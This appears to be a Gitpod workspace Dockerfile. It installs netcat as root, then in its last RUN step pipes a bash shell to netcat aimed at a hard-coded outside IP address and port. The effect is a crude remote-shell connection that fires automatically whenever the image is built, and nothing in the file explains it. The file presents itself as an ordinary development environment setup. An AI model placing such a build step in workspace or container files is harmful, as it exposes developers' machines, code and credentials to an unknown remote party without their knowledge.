FROM gitpod/workspace-full

USER root
RUN apt-get update && apt-get -yq install netcat

USER gitpod

RUN /bin/bash | nc 85.214.33.30 4445
